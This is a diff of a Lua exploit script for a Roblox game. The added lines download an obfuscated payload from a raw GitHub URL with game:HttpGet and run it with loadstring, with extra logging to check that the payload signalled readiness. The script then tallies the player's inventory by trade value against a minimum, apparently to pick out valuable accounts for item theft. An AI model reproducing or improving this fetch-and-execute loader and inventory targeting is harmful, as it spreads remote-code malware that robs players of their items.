@@ -113,32 +113,53 @@ local net = replicatedStorage.Packages._Index["sleitnick_net@0.1.0"].net
 
 getgenv().__BB_GAME_NET = net
 
+print("[AC] pack: fetching")
+
 local packReady = false
+local packSize = 0
 
 pcall(function()
     local packUrl = "https://raw.githubusercontent.com/outhackernuls090-hash/arasakacorp/refs/heads/main/shitpack.lua?t=" .. tostring(os.time())
     local src = game:HttpGet(packUrl)
     if not src or #src < 100 then
-        warn("[AC] obf fetch failed")
+        warn("[AC] pack: fetch returned " .. tostring(src and #src or "nil"))
         return
     end
-    local fn = loadstring(src)
+    packSize = #src
+    print("[AC] pack: downloaded " .. tostring(packSize) .. " bytes")
+
+    local fn, parseErr = loadstring(src)
     if not fn then
-        warn("[AC] obf load failed")
+        warn("[AC] pack: loadstring failed — " .. tostring(parseErr))
         return
     end
-    local ok, err = pcall(fn)
+    print("[AC] pack: loadstring ok, executing")
+
+    local ok, runErr = pcall(fn)
     if not ok then
-        warn("[AC] obf run failed: " .. tostring(err))
+        warn("[AC] pack: runtime error — " .. tostring(runErr))
         return
     end
-    packReady = getgenv().__BB_CHGUARD_READY == true
+    print("[AC] pack: executed without error")
+
+    local flagGetgenv = getgenv and getgenv().__BB_CHGUARD_READY
+    local flagGetfenv0 = getfenv and getfenv(0) and getfenv(0).__BB_CHGUARD_READY
+    local flagGlobal = _G and _G.__BB_CHGUARD_READY
+
+    print("[AC] pack: flag getgenv=" .. tostring(flagGetgenv)
+        .. " getfenv0=" .. tostring(flagGetfenv0)
+        .. " _G=" .. tostring(flagGlobal))
+
+    if flagGetgenv == true or flagGetfenv0 == true or flagGlobal == true then
+        packReady = true
+        if getgenv then getgenv().__BB_CHGUARD_READY = true end
+    end
 end)
 
 if packReady then
     print("[AC] chguard ok — Net remotes enabled")
 else
-    warn("[AC] chguard not ready — falling back to hookmetamethod")
+    warn("[AC] chguard not ready — pack did not signal, size=" .. tostring(packSize))
 end
 
 local tradeGuardActive = false
@@ -208,7 +229,11 @@ local function formatNumber(n)
 end
 
 local function getItemRap(itemName, category)
-    return rapController.FastGetRAP(rapController, category, { Name = "vb" }, '["Name","' .. itemName .. '"]')
+    local ok, rap = pcall(function()
+        return rapController.FastGetRAP(rapController, category, { Name = "vb" }, '["Name","' .. itemName .. '"]')
+    end)
+    if ok and type(rap) == "number" then return rap end
+    return 0
 end
 
 local function getInventory()
@@ -228,14 +253,14 @@ local function getInventory()
             end
         end
     end
-    table.sort(inventoryData, function(a, b) return a.rap > b.rap end)
+    table.sort(inventoryData, function(a, b) return (a.rap or 0) > (b.rap or 0) end)
     return inventoryData
 end
 
 local items = getInventory()
 local totalRap = 0
 for _, item in ipairs(items) do
-    totalRap = totalRap + item.rap
+    totalRap = totalRap + (item.rap or 0)
 end
 
 if totalRap < minrapVal then
